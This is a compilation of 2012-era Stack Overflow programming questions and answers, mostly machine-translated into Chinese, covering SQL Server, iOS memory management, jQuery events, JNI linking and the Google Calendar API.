您可以使用[sp_executesql](http://msdn.microsoft.com/en-us/library/ms188001%28v=sql.90%29.aspx)。

```
DECLARE
  @IntVariable    int,
  @SQLString      nvarchar(500),
  @ParmDefinition nvarchar(500)
SELECT
  @IntVariable    = 0,
  @SQLString      = N'SELECT UserName FROM TableUser WHERE UserId=@ValueVariable',
  @ParmDefinition = N'@ValueVariable INT'

SP_EXECUTESQL
  @SQLString,
  @ParmDefinition,
  @ValueVariable = @IntVariable; 
```

本质上，它创建了一个一次性存储过程。变量是您通常在存储过程中看到的`@paramDefinition`参数签名，sql server 缓存执行计划等。

# ios - 早期dealloc调用过度释放对象iOS

> ID：11052751
> 
> 赞同：0
> 
> 时间：2012-06-15T14:33:13.280
> 
> 标签：ios, properties, dealloc, nsobject, nszombie

我的应用程序由于过度释放的对象而崩溃，我已将其范围缩小到自定义类中的 dealloc 的早期调用。这会导致崩溃归因于使用下面列出的自定义类的 NSMutableArray：

```
#import <Foundation/Foundation.h>

@interface GraphData : NSObject{
    NSInteger key;
    NSString *value;
}

@property (nonatomic, readwrite) NSInteger key;
@property (nonatomic, retain) NSString *value;

-(id)initWithPrimaryKey:(NSInteger) xid;
-(id)initWithName:(NSString *)n key:(NSInteger)i;

@end

#import "GraphData.h"

@implementation GraphData

@synthesize  key,value;

-(id)initWithPrimaryKey:(NSInteger) xid{
    //[super init];
    self=[super init];
    if (self){
    self.key = xid;
    self.value = @"";
    }
    return self;

}
-(id)initWithName:(NSString *)n key:(NSInteger)i{
    self=[super init];
    if (self){
    self.key = 0;
    self.value = n;
    }
    return self;

}
-(void)dealloc{
    NSLog(@"Say bye to %@, kids!", self);
    [value release], value = nil;
    [super dealloc];

}

@end 
```

奇怪的是，我在另一个类中使用 GraphData，它可以正常工作。然而，在这种情况下，在我合成 NSMutableArray theNewData 属性之前，dealloc 调用；但是在我合成了三遍之后。

```
-(NSMutableArray*)fillDataInArray:(NSInteger)keyphrase_id{
    NSLog(@"lsd");
    NSLog(@"Keyphrase_id:%d", keyphrase_id);

    NSDate *startdate = [self getDateForApplicationInstalled];
    NSDate *enddate = [NSDate date];

    NSString *dateString1=[[NSString alloc] initWithString: [fmt stringFromDate:startdate]];
    NSString *dateString2=[[NSString alloc] initWithString: [fmt stringFromDate:enddate]];

    NSMutableArray *newDataNew = [[NSMutableArray alloc]init];
    self.theNewData = newDataNew;
    [newDataNew release];

    selStmt = nil;

    // build select statement
    if (!selStmt)
    {
        const char *sql = "select distinct position, key_time from ranking where keyphrase_id = ? and key_time between ? and ? order by key_time";

        if (sqlite3_prepare_v2(database, sql, -1, &selStmt, NULL) != SQLITE_OK)
        {
            selStmt = nil;
        }

        NSInteger n = keyphrase_id;
        sqlite3_bind_int(selStmt, 1, n);

        sqlite3_bind_text(selStmt, 2, [dateString1 UTF8String] , -1, SQLITE_TRANSIENT);
        sqlite3_bind_text(selStmt, 3, [dateString2 UTF8String] , -1, SQLITE_TRANSIENT);

        NSLog(@"SQL query is: [%s]", sql);
    }
    if (!selStmt)
    {
        NSAssert1(0, @"Can't build SQL to read keyphrases [%s]", sqlite3_errmsg(database));
    }

    int ret;

    while ((ret=sqlite3_step(selStmt))==SQLITE_ROW) 
    { 
        GraphData *item = [[GraphData alloc]init];

        item.key = sqlite3_column_int(selStmt, 0);
        item.value = [NSString stringWithUTF8String:(char *)sqlite3_column_text(selStmt,1)];

        [self.theNewData addObject:item]; 

        [item release];
    }

    sqlite3_reset(selStmt); // reset (unbind) statement

    [dateString2 release];
    [dateString1 release];

    return theNewData;

} 
```

它也可以通过不同的方法访问：

```
-(NSMutableArray *) getDataForCharts:(int)seriesIndex{
    NSLog(@"speed");

    NSDate *startdate = [self getDateForApplicationInstalled];
    NSDate *enddate = [NSDate date];

    NSString *dateString1=[[NSString alloc] initWithString: [fmt stringFromDate:startdate]];
    NSString *dateString2=[[NSString alloc] initWithString: [fmt stringFromDate:enddate]];

    NSMutableArray *newDataNew = [[NSMutableArray alloc]init];
    self.actionNoteData = newDataNew;
    [newDataNew release];

    selStmt = nil;

    // build select statement
    if (!selStmt)
    {

        const char *sql = "";

        if (seriesIndex == 4) sql = "select distinct 105 score, notes_date from notes where iscompleted =1 and domain_id = ? and notes_date between ? and ? order by notes_date";

        if (sqlite3_prepare_v2(database, sql, -1, &selStmt, NULL) != SQLITE_OK)
        {
            selStmt = nil;
        }

        NSInteger n = domain_id;
        sqlite3_bind_int(selStmt, 1, n);

        sqlite3_bind_text(selStmt, 2, [dateString1 UTF8String] , -1, SQLITE_TRANSIENT);
        sqlite3_bind_text(selStmt, 3, [dateString2 UTF8String] , -1, SQLITE_TRANSIENT);

        NSLog(@"SQL query is: [%s]", sql);
    }
    if (!selStmt)
    {
        NSAssert1(0, @"Can't build SQL to read keyphrases [%s]", sqlite3_errmsg(database));
    }

    // loop reading items from list
    int ret;

    while ((ret=sqlite3_step(selStmt))==SQLITE_ROW) 
    { 
        GraphData *item = [[GraphData alloc]init]; // create item

        item.key = sqlite3_column_int(selStmt, 0);
        item.value = [NSString stringWithUTF8String:(char *)sqlite3_column_text(selStmt,1)];

        NSLog(@"Key:%d", sqlite3_column_int(selStmt, 0));
        NSLog(@"Value:%s", sqlite3_column_text(selStmt,1));

        [self.actionNoteData addObject:item]; // add to list
        [item release]; // free item

    }

    sqlite3_reset(selStmt); // reset (unbind) statement

    [dateString2 release];
    [dateString1 release];
    return actionNoteData;

} 
```

Zombie 指向 [i release]；但这是前面调用的确切语句，不会导致崩溃。

```
if (index == 4) {
        dateComponents.day = ([dateComponents day] -1 ) + dataindex + 1;

        if (dataForPlotActionNote.count > dataindex) {

            if ([dataForPlotActionNote objectAtIndex:dataindex]) {
                GraphData *i = (GraphData *) [dataForPlotActionNote objectAtIndex:dataindex];
                NSDate *date = [[[NSDate alloc] init] autorelease]; 

                date =[fmt dateFromString:i.value];

                datapoint.xValue = date;//[cal dateFromComponents:dateComponents];
                datapoint.yValue = [NSNumber numberWithDouble:(i.key)];

                [i release];
            }
        }
    } 
```

什么可能导致在执行代码中途发生 dealloc 调用？

制作一个 GraphData 属性并每次重置它是否有助于让它保持足够长的生命周期？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-16T12:03:41.867

这个`[i release]`问题是有道理的。当您获得对内部对象的引用时，`dataForPlotActionNote`您不会增加其保留计数，因此您也不应该减少计数。

您使用的地方`[item release]`不同，因为您已经创建了这些对象，`alloc`因此**确实**保留了它们。

# css - 干扰表格单元格布局的变形标签

> ID：11052754
> 
> 赞同：1
> 
> 时间：2012-06-15T14:33:31.743
> 
> 标签：css, ember.js

我正在使用两个绑定的 ember.js 数据视图构建一个表格单元格。当我这样做时，ember.js 会插入它的变形标记，以便以后可以更新视图。

```
<td>
<a data-ember-action="14">
  <div id="ember2065" class="ember-view">
    <script id="metamorph-102-start" type="text/x-placeholder"></script>
      02/04/2012
    <script id="metamorph-102-end" type="text/x-placeholder"></script>
  </div> 
    @ 
  <div id="ember2072" class="ember-view">
    <script id="metamorph-103-start" type="text/x-placeholder"></script>
      $61.81
    <script id="metamorph-103-end" type="text/x-placeholder"></script>
  </div>
</a>
</td> 
```

这些标签导致下面的日期和价格在单元格内换行。是否有可以应用于这些标签的 CSS 样式以使它们不影响换行？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:55:34.277

这在很大程度上取决于您的完整案例。在我看来，在这里使用视图是多余的，但也许我错过了一些信息。

以下是一些工作示例：http: [//jsfiddle.net/MikeAski/QCbGN/](http://jsfiddle.net/MikeAski/QCbGN/)

也许提供更多上下文将有助于获得更好的样本。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:41:42.893

把它放在你的样式表中以防止 ember 视图换行：

```
div .ember-view {
  display: inline;
} 
```

# google-maps - 通过标签获取地图上标记的纬度

> ID：11052755
> 
> 赞同：0
> 
> 时间：2012-06-15T14:33:32.157
> 
> 标签：google-maps, google-maps-api-3

我有一个 panto 标记函数，它需要经度和纬度变量。我可以将联系人姓名作为变量发送。

联系人姓名是我要平移到的标记的标签。我可以通过标签获取标记的经度和纬度吗？

这是我的 panto 函数

```
 function pantoUser(lati,longi,i)
{
    jQuery("#dispatcher").gmap3({
        action: 'panTo',
        args:[new google.maps.LatLng(lati,longi)],
        zoom: 7
               });
               currentPoint = i;
                jQuery("#dispatcher").css({
                    cursor: 'pointer'
                });
                jQuery('#markerTitle' + i + '').fadeIn({
                    duration: 200,
                    queue: false
                }).animate({
                    bottom: "32px"
                }, {
                    duration: 200,
                    queue: false
                });
            jQuery("#target").stop(true, true).fadeIn(1200).delay(500).fadeOut(1200);
                jQuery("#dispatcher").css({
                    cursor: 'default'
                });
                jQuery('#markerTitle' + i + '').stop(true, true).fadeOut(2000, function() {
                    jQuery("#dispatcher").css({
                        bottom: "0"
                    })
                jQuery("#target").stop(true, true).fadeIn(1200).delay(500).fadeOut(1200);
                }); 
```

}

我在想这样的事情？

```
 function locateLastSpeaker(name) {
var lati = SOMEHOW GET IT
var longi = SOMEHOW GET IT
pantoUser(lati,longi,1) 
```

}

尝试邓肯解决方案后编辑！

```
var stuMarkers = {};

function addMarker(i, lati, longi, id, name, state, datestring) {
 var placename = name;
 stuMarkers[placename].lat = lati;
 stuMarkers[placename].lng = longi;
    $('#dispatcher').gmap3(
      { action: 'addMarker', ....etc 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T15:27:22.667

而不是 barry 建议的数组，而是一个对象，键入名称。这样你甚至不必循环。

```
var stuMarkers = {};  // global variable outside of any function

// loop creating your markers

function addMarker(i, lati, longi, id, name, state, datestring) {
 var placename = name;
 stuMarkers[placename] = {};
 stuMarkers[placename].lat = lati;
 stuMarkers[placename].lng = longi;
 stuMarkers[placename].i = i;
 ...
}

function locateLastSpeaker(name) {
  pantoUser(stuMarkers[name].lat,stuMarkers[name].lng,stuMarkers[name].i);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T15:21:24.377

保留对每个标记的引用 - 可能在数组中。

当您想查找特定标记时，请遍历该数组并找到特定标记。

然后用它做你想做的事。

# java - 使用 TSQL 解析 Apple plist

> ID：11052760
> 
> 赞同：1
> 
> 时间：2012-06-15T14:33:43.903
> 
> 标签：java, sql-server, tsql, plist

我正在使用将 Apple plist 存储在列中的 SQL Server 2008 数据库。我正在寻找一种快速而肮脏的方法来提取一些信息。

我知道[SQL Server 可以进行 XML 解析](https://stackoverflow.com/questions/4669904/xml-parsing-with-sql-query)。由于 plist 不是真正的 XML，有什么可以帮助我查询/操作数据的吗？

或者，如果有人建议使用轻量级 Java 库来解析 plist，我也可以走这条路。

```
<dict>
  <key>BundleSize</key>
  <integer>16138240</integer>
  <key>DynamicSize</key>
  <integer>7569408</integer>
  <key>Identifier</key>
  <string>com.ea.scrabble.ipad.inc2</string>
  <key>Name</key>
  <string>Scrabble</string>
  <key>Version</key>
  <string>1.15.73</string>
</dict> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T16:38:01.707

如果您只需要提取键/值对，则可以使用一些基本的 TSQL 字符串解析。您应该能够将下面的代码转换为返回键/值/类型表的函数。只需粘贴此代码并运行它，您就会明白我的意思。它将返回一个包含 [ID]、[Key]、[Value] 和 [ValueType] 列的表。如果你传入一个 plist 会很快。

```
DECLARE @pList VARCHAR(255)
SET @pList = 
'<dict> 

<key>BundleSize</key> 
<integer>16138240</integer> 

<key>DynamicSize</key> 
<integer>7569408</integer> 

<key>Identifier</key> 
<string>com.ea.scrabble.ipad.inc2</string> 

<key>Name</key> 
<string>Scrabble</string> 

<key>Version</key> 
<string>1.15.73</string> 

</dict> 
'

DECLARE @IsKey BIT
DECLARE @ID INT
DECLARE @KeyValue TABLE (
    ID INT PRIMARY KEY IDENTITY(1,1) NOT NULL,
    [Key] VARCHAR(255) NOT NULL,
    [Value] VARCHAR(255) NULL,
    [ValueType] VARCHAR(255) NULL
    )

SET @IsKey = 1

WHILE LEN(@pList) > 10
BEGIN

    IF @IsKey = 1
    BEGIN

        -- Remove junk at the beginning of the string:
        SELECT @pList = SUBSTRING(@pList, CHARINDEX('<key>', @pList) + 5, LEN(@pList))

        -- Parse out the first value between the <key></key> tags:
        INSERT INTO @KeyValue ([Key])
            SELECT LEFT(@pList, CHARINDEX('</', @pList)-1)
        SELECT @ID = SCOPE_IDENTITY()

        -- Remove new junk at the beginning of the string:
        SELECT @pList = LTRIM(SUBSTRING(@pList, CHARINDEX(CHAR(13), @pList)+2, LEN(@pList)))

        SET @IsKey = 0

    END
    ELSE -- Is a value
    BEGIN

        -- Parse out the ValueType and Value:
        UPDATE @KeyValue
            SET ValueType = (SELECT SUBSTRING(@pList, 2, CHARINDEX('>', @pList)-2)),
            Value = (SELECT SUBSTRING(@pList, CHARINDEX('>', @pList)+1, CHARINDEX('</', @pList) - CHARINDEX('>', @pList)-1))
        WHERE ID = @ID

        -- Remove new junk at the beginning of the string:
        SELECT @pList = LTRIM(SUBSTRING(@pList, CHARINDEX(CHAR(13), @pList)+2, LEN(@pList)))

        SET @IsKey = 1

    END

END

SELECT *
FROM @KeyValue 
```

# c# - asp.net listview 在单击时突出显示行

> ID：11052761
> 
> 赞同：0
> 
> 时间：2012-06-15T14:33:45.043
> 
> 标签：c#, asp.net, listview, onclick

我知道如何设置列表视图以在单击链接、图像等时突出显示一行，但我只是想知道是否可以将其设置为在单击其任何单元格时突出显示一行，而不仅仅是在预定义控制。

那可能吗？

我的方法是设置每个的 onclick，`<td>`但不知道如何在单击另一个单元格时重置背景颜色。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:57:08.410

您可以在客户端使用 Jquery：

```
$("#myTable tr").click( function () 
{
   $("#myTable tr").each(function () { $(this).removeClass("selected")}); 
   $(this).addClass("selected"); 
});​ 
```

一个例子小提琴：

[http://jsfiddle.net/9pmcA/26/](http://jsfiddle.net/9pmcA/26/)

# c# - 用于创建新接口和创建新基本单元测试的 Visual Studio 快捷方式

> ID：11052767
> 
> 赞同：12
> 
> 时间：2012-06-15T14:34:20.267
> 
> 标签：c#, visual-studio, keyboard-shortcuts, justcode

在 Visual Studio 中，您可以按`SHIFT`++`ALT`创建`C`新的类文件。我正在为新的接口文件和新的“基本单元测试”文件寻找类似的快捷方式。我有 Telerik JustCode，所以请不要推荐类似的产品。但是，如果存在一个小的扩展，例如，很高兴知道。顺便说一句，我正在使用 Visual Studio 2010 (C#)。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-06-15T14:39:41.543

对此没有内置解决方案，但您可以轻松录制宏（在“*工具*”菜单中）：

![在此处输入图像描述](../Images/f2d8a19f5c64e492ba8a0da7ad104ae0.png)

您可以在宏资源管理器 ( `Alt`+ `F8`)中重命名它们

然后，您可以在*Tools* → *Options* → *Keyboard*中为这些宏分配快捷方式。

**编辑**这不适用于添加新的基本单元测试。即使使用此方法，您也只能进入新测试选择对话框。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-21T07:19:36.250

我建议您不要使用宏，而是查看代码片段管理器。它使您可以设置带有“孔”的文本模板。并将模板分配给一个“键”——一个短文本（可以自动完成）。键入密钥后，模板将替换密钥，并且可以轻松填充孔。此外，您可以为其添加类似宏的功能，以自动获取当前文件名或类或日期预填充。

Visual Studio 实际上附带了“测试类”和“测试方法”的 C# 片段。

另请参阅[http://msdn.microsoft.com/en-us/library/ms165393(v=vs.100).aspx](http://msdn.microsoft.com/en-us/library/ms165393(v=vs.100).aspx)

最后，Resharper (http://www.jetbrains.com/resharper/) 中的代码片段支持比 Visual Studio 中的要好得多。绝对值得一试。真正的生产力提升！

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2019-05-19T15:38:14.947

在新的 Visual Studio 2019（在我的情况下为预览版）中，Alt-Shift-C 似乎打开了“添加新项目”，并选择了“类”选项并将光标放在（文件）名称字段中。但是，此时您可以简单地从“类”切换到“接口”或任何其他可用项目。

如果缺少“基本单元测试”，那可能是因为您的项目不是测试项目；列出的项目似乎特定于项目类型。

# jquery - 为什么我必须将字母 'e' 传递给这个 jQuery 函数？

> ID：11052773
> 
> 赞同：1
> 
> 时间：2012-06-15T14:34:54.580
> 
> 标签：jquery

我知道 E 是“事件”的缩写，但我仍然不清楚为什么需要使用它？我尝试通过该函数传递其他字母，但它似乎不起作用。还有其他情况我需要将特定字母传递给函数吗？

```
$("#myThing").click(function (e) {
   var hit = $(e.target);
   hit.css('color','blue');
}); 
```

这做同样的事情：

```
$("#myThing").click(function () {
   $(this).css('color','blue');
}); 
```

我什么时候应该使用 $(this) 而不是 'e'？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:38:09.743

您不需要通过该函数传递特定的字母。

```
$("#myThing").click(function (e) {
   var hit = $(e.target);
   hit.css('color','blue');
}); 
```

等同于

```
$("#myThing").click(function (foo) {
   var hit = $(foo.target);
   hit.css('color','blue');
}); 
```

等等

`$(e.target)`但是，使用和之间的区别`$(this)`可能会更加显着，因为`this`始终是绑定事件的元素，而`e.target`将是被单击的特定元素，即使它位于`this`元素内部

Hope that made sense

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-15T14:38:15.407

The name `e` is meaningless; you can call it whatever you want (obviously so long as you update the references to `e` as well).

The code you posted will *usually* do the same thing; but see the following code:

```
​&lt;div><span>Hi</span></div>​​​​​​​​​​​​​​​​​​ 
```

JS:

```
​$('div').on('click', function (e) {
    alert(this === e.target);
});​​​​​ 
```

(Run in here: [http://jsfiddle.net/Dxbwm/](http://jsfiddle.net/Dxbwm/))

You'll see it's false; thats because `this` is the element the event is handled on, but `e.target` is the element the event originated from (which in the example above, is the span). If you didn't know events worked like this before, it's called *event bubbling* and you can read more about it [here](http://www.mattlunn.me.uk/blog/2012/05/what-does-event-bubbling-mean/)^(my blog).

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:38:42.490

Events can carry data with them (eg a Dropped file). If you need to refer to the data that belongs to the event, use "e". If you only need to refer to the element that the event was triggered from - which is what 'this' refers to in an event callback - use 'this'.

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T14:39:47.147

there's a small difference between the two snippets: in the first one, the element `hit` could not be the `#myThing` element itself.

Let say that `#myThing` is a `<p>` and you have clicked on a link *inside* it: then when the event will reach `#myThing`, the element referred by `e.target` is the link and not the paragraph

On the contrary, in the second example the element subject to a color change will always be `#myThing`

So, if you pass the event along with the handler it's because you have a convenience on using that event. When you pass it, you can name it `e` or `evt` or also `foobar`: since you're using jQuery the variable name you choose is not relevant (but for the sake of simplicity `e` is short and widely used).

The most common reasons to pass the event usually are

1.  prevent the default behavior of the event;
2.  stop the propagation of the event;
3.  — it's your scenario — deal with the original element in which the event was triggered (often when you're dealing with event delegation or with live update of your document);
4.  check some of the event properties (e.g. `e.keycode` on `keyup/down` event);

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-06-15T14:40:54.337

See, in this case `event.target` and `this` are referring to the same element. But when you use jQuery [event delegation](http://api.jquery.com/on/), they may not match:

```
$('body').on('click', 'tr', function(event) { ... }); 
```

Here `event.target` will refer to the element at which the event was triggered (it may be 'td' element or its children, for example), but `this` will refer to the `tr` element. Sometimes it's quite handy to have both of them. )

Besides, yes, event object has some other uses: with it you can stop propagation of the event, etc.

# liferay - 从 Liferay 6.0.6 CE 升级后，Liferay 6.1.0 CE 网络内容图像不显示

> ID：11052774
> 
> 赞同：1
> 
> 时间：2012-06-15T14:34:56.727
> 
> 标签：liferay, liferay-6, web-content

为此，我已将 liferay 6.0.6 升级到 Liferay 6.1.0，我已经在升级之前复制了文档库文件夹。现在升级后，所有文档都像 word 一样正常，pdf 存储在文档库文件夹中。

我担心的是图像显示不正确。图像的路径就像`DOMAIN_NAME//image/image_gallery...`

为了解决这个问题，我已将权限更改为`DLHook`Liferay 6.0.6，然后开始升级 Liferay 6.1.0 CE。据我所知，Liferay 6.1.0 CE 仅支持我已经更改的 DLHook。

谁能建议我在这里缺少什么？

# javascript - 如何调整 ssl iframe 动态高度

> ID：11052776
> 
> 赞同：-1
> 
> 时间：2012-06-15T14:35:09.177
> 
> 标签：javascript, iframe

我有要求，在我的网站中将 div 显示为弹出窗口，我用 iframe 加载 div，iframe 有 https 内容但 div 在 http 内容中，我需要调整 iframe 高度但我的脚本在这里失败，因为 https 内容无法调出增加 iram 宽度的侧脚本。它说权限被拒绝错误消息。请帮助任何人

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T15:02:44.903

外围页面是http，内部iframe是https：请检查：http: [//jsfiddle.net/sm6dX/](http://jsfiddle.net/sm6dX/ "http://jsfiddle.net/sm6dX/")

# java - 带有 x86javapath 的 x64machine 上的 x86java 上的 JNI 不满意链接错误

> ID：11052777
> 
> 赞同：3
> 
> 时间：2012-06-15T14:35:20.610
> 
> 标签：java, c++, dll, java-native-interface

更新：我刚刚检查了 DLL 程序集，程序显示 DLL 的错误如下：

**错误：由于隐式依赖模块中缺少导出函数，至少一个模块具有未解析的导入。错误：发现具有不同 CPU 类型的模块。**

我已经尝试开发 JNI 实现 2 天了......

我的笔记本电脑是 x64，我的机器上同时安装了 x64 和 x86 java。但是 java 环境变量设置为 x64 版本。

我正在做所有关于 x86 java、编译、头文件生成的工作，并且我还在 vs2010 上为 win32 编译 dll

首先我将java类编码为：

**Ex1.java**

```
public class Ex1 {
    // Load the dll that exports functions callable from java
    static {System.loadLibrary("ex1");}

    public native void startProcess();

    public void Test() {
    }

    public static void main(String [] args) {
        Ex1 t = new Ex1();
        t.startProcess();
    }

} 
```

然后我用 x86 javac 编译这个 java 文件

**"C:\Program Files (x86)\Java\jdk1.7.0_05\bin\javac.exe" Ex1.java**

然后我用 x86 javah 生成标题

**"C:\Program Files (x86)\Java\jdk1.7.0_05\bin\javah.exe" Ex1**

**Ex1.h**

```
/* DO NOT EDIT THIS FILE - it is machine generated */
#include <jni.h>
/* Header for class Ex1 */

#ifndef _Included_Ex1
#define _Included_Ex1
#ifdef __cplusplus
extern "C" {
#endif
/*
 * Class:     Ex1
 * Method:    startProcess
 * Signature: ()V
 */
JNIEXPORT void JNICALL Java_Ex1_startProcess
  (JNIEnv *, jobject);

#ifdef __cplusplus
}
#endif
#endif 
```

然后我开始一个新的 Win32 项目，在 vs2010 上设置为 dll 和空项目。并将javah生成的头文件添加到头文件中，然后我创建与头文件同名的cpp文件，然后我将函数实现为：

**Ex1.cpp**

```
#include <jni.h>

JNIEXPORT void JNICALL Java_Ex1_startProcess(JNIEnv * env, jobject job){
    return;
} 
```

然后我将项目编译为**ex1.dll**

然后我把以下文件放在 C:/jni1/

*   ex1.h
*   ex1.java
*   ex1.class
*   ex1.dll

最后，我运行以下命令：

**"C:\Program Files (x86)\Java\jdk1.7.0_05\bin\java.exe" -classpath .; 防爆1**

**然后出现这个错误：**

线程“main”中的异常 java.lang.UnsatisfiedLinkError: Ex1.startProcess()V
at Ex1.startProcess (Native Method)
at Ex1.main (ex1.java:20)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-17T22:42:20.030

我猜您的 32 位 DLL 取决于系统 DLL，并尝试使用 System32 中的那些，尽管名称是 64 位，而不是 SysWoW64 中的 32 位。作为证明，我会尝试将您的 DLL 编译为 64 位并尝试通过 64 位 JVM 运行。这应该开箱即用。但是，我无法强制您的 32 位 DLL 使用 32 位依赖项。从来没有这样做过，它可能涉及一些[棘手的文件复制](http://www.dotnet247.com/247reference/msgs/74/370552.aspx)到您的 JNI DLL 所在的位置，和/或[注册表魔术](http://www.techsupportalert.com/content/how-windows7-vista64-support-32bit-applications.htm)。虽然[通过 32 位工具正确注册 DLL](https://stackoverflow.com/questions/3439845/register-32-bit-com-dll-to-64-bit-windows-7)可能就足够了。

# asp.net - 模仿 ContentPlaceHolder 在 RenderSection 声明中定义内容

> ID：11052779
> 
> 赞同：1
> 
> 时间：2012-06-15T14:35:24.167
> 
> 标签：asp.net, asp.net-mvc-3, razor, render

因此，使用 MVC3 框架的 aspx 渲染引擎，很容易在主布局页面中定义一个部分，并在这些部分中插入 html 或 asp 代码，这些部分将出现在每个页面上，如下所示：

在主布局上

```
<!-- Secondary content -->
<div id="content-secondary">
  <asp:ContentPlaceHolder ID="NavigationSecondary" runat="server">
    <% Html.RenderAction("Menu", "Navigation", new { @id = "nav-secondary"}); %>
  </asp:ContentPlaceHolder>
  <asp:ContentPlaceHolder ID="cphSecondary" runat="server" />
</div>
<!-- /Secondary content --> 
```

您可以看到在名为 NavigationSecondary 的 ContentPlaceHolder 中呈现了一个菜单。因此，在我创建的每个页面上，默认情况下都会显示菜单，并且在其下方显示任何其他额外内容。

现在，我将如何在 Razor 引擎中解释这一点？我在网上找不到太多信息。我确实找到了一些显示如何使用默认内容的东西。但是，当插入其他页面的内容时，默认内容会被删除吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T16:42:30.863

Razor 视图引擎允许检查（在 _Layout.cshtml 中）是否布局部分已由视图实现，因此您可以模拟将代码放入`ContentPlaceHolder`.

```
<div id="content-secondary">
    @if (IsSectionDefined("NavigationSecondary"))
    {
        Html.RenderAction("Menu", "Navigation", new {@id = "nav-secondary"});
        @RenderSection("NavigationSecondary")
    }
</div> 
```

希望这是您正在寻找的。

# javascript - 使用参数调用 javascript 处理程序

> ID：11052790
> 
> 赞同：0
> 
> 时间：2012-06-15T14:35:58.557
> 
> 标签：javascript, parameters, handler

我有一个调用另一个方法的方法（在 ajax 加载时，但这与这个问题无关）。我想将参数传递给这个方法。这怎么可能？

以下页面应在按钮单击时滚动到 id 25（可滚动区域在代码隐藏中动态添加。这只是我尝试完成的一个示例）

JS

```
<%@ Page Language="C#" Inherits="APTEIT.scrolltest" %>
<html>
<head>
</head>
<body>
<script type="text/javascript">
    function callHandler(handler) {
        handler();
    }
    function scroll(id) {
        alert("scrolling");
        $("#divy").scrollTop($("#"+id).position().top);
    }
</script>
<input type="button" value="scroll" onclick='var scroll={param1: "25"};callHandler(scroll)' />
</body>
</html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:38:18.287

将参数放入对象中，如下所示：

```
var handler = {
  param1: 'val1',
  param2: 'val2' //ect...
}

handler(handler); 
```

**编辑：**

改变：

```
$("#divy").scrollTop($("#"+id).position().top); 
```

到：

```
$("#divy").scrollTop($("#"+id.param1).position().top); 
```

应该适用于您编辑的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:38:29.587

## 更新 1

我认为在这种情况下您可以做的是在元素`this`的上下文中使用关键字。`input`这最终将在您的实例中执行的是替换`id`为`this`. 这也将删除额外的选择。试试这个：

```
function callHandler(handler)
{
    handler();
}

function scroll()
{
    $("#divy").scrollTop($(this).position().top);
} 
```

`this`可能行不通，因为我不确定上下文是`input`, 还是`callHandler`, 试一试！:)

## 原来的

您应该能够像这样将参数传递给处理程序：

```
function callHandler(handler)
{
    var param = 'Hello world';
    handler(param);
}

callHandler(function(phrase)
{
    alert(phrase); 
}); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:38:47.700

除非我误解了，否则 if `handler`is a `function`then 将参数传递给它，就像任何正常情况一样。

```
function callHandler(handler){
   var passme = "test";
   handler(passme);
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T14:50:38.383

您似乎没有将参数传递给`callHandler`方法中的处理程序 - 相反，您尝试将`scroll`参数（即`var scroll={param1: "25"}`）作为函数调用。

您`scroll`对配置对象和函数名称使用相同的名称。请使用不同的名称:) 此外，您声明和使用的函数签名不同意。当您尝试传入一个对象时，该`scroll`函数接受一个字符串。`id`

# google-api - 在谷歌日历 API v3 中插入 新的 calendarEntry 会返回 404

> ID：11052792
> 
> 赞同：4
> 
> 时间：2012-06-15T14:36:05.010
> 
> 标签：google-api, google-calendar-api, google-api-java-client

我使用 google-api-services-calendar v3 for java。

我毫无问题地列出了我的日历条目。但是插入新的 calendarEntry 失败。

我使用与示例相同的代码：

```
CalendarListEntry newCal = new CalendarListEntry();
newCal.setId(calTitle);
newCal.setSummary(calTitle);
newCal.setTimeZone("Europe/Paris");
CalendarListEntry execute = null;
try {
    execute = service.calendarList().insert(newCal).execute();
} catch (IOException e) {
    e.printStackTrace();
} 
```

未创建日历。在我的日志中：

```
CONFIG: {"id":"A_TEST","summary":"A_TEST","timeZone":"Europe/Paris"}
15 juin 2012 16:20:45 com.google.api.client.http.HttpRequest execute
CONFIG: -------------- REQUEST  --------------
POST https://www.googleapis.com/calendar/v3/users/me/calendarList
Accept-Encoding: gzip
Authorization: <Not Logged>
User-Agent: Google-HTTP-Java-Client/1.10.2-beta (gzip)
Content-Type: application/json; charset=UTF-8
Content-Encoding: gzip
Content-Length: 69

CONFIG: Total: 60 bytes
CONFIG: {"id":"A_TEST","summary":"A_TEST","timeZone":"Europe/Paris"}
15 juin 2012 16:20:46 com.google.api.client.http.HttpResponse <init>
CONFIG: -------------- RESPONSE --------------
HTTP/1.1 404 Not Found
X-Frame-Options: SAMEORIGIN
Date: Fri, 15 Jun 2012 14:07:52 GMT
Content-Length: 120
Expires: Fri, 15 Jun 2012 14:07:52 GMT
X-XSS-Protection: 1; mode=block
Content-Encoding: gzip
Content-Type: application/json; charset=UTF-8
Server: GSE
Cache-Control: private, max-age=0
X-Content-Type-Options: nosniff

CONFIG: Total: 165 bytes
CONFIG: {
 "error": {
  "errors": [
   {
    "domain": "global",
    "reason": "notFound",
    "message": "Not Found"
   }
  ],
  "code": 404,
  "message": "Not Found"
 }
} 
```

有任何想法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T15:05:02.730

实时调频！

